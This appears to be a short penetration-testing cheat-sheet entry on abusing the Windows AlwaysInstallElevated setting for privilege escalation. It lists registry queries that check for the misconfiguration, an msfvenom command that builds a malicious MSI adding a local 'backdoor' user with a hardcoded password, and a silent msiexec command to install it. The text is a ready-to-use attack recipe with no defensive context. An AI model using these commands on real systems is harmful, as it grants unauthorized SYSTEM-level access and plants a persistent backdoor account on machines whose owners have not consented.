## Regsiter Gems 

## AlwaysInstallElevated

AlwaysInstallElevated is a setting that allows non-privileged users the ability to run Microsoft Windows Installer Package Files (MSI) with elevated SYSTEM permissions.

Verify that 2 values are set to "1":

```
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Then, create a malicous MSI file using msfvenom:

```
root@kali:~/#: msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
```

And execute it:

```
C:\> msiexec /quiet /qn /i C:\evil.msi
```
